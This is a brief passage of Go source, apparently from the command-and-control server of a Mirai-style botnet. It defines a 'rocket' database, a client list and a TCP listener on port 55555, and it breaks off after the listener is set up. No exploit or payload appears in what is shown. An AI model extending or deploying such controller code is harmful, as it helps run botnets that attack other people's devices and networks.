...
const DatabaseTable string  = "rocket" //you can change this database name but you also need to change it when running all the mysql shit.

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    tel, err := net.Listen("tcp", "1.1.1.1:55555") 
    if err != nil {
        fmt.Println(err)
        return
    }
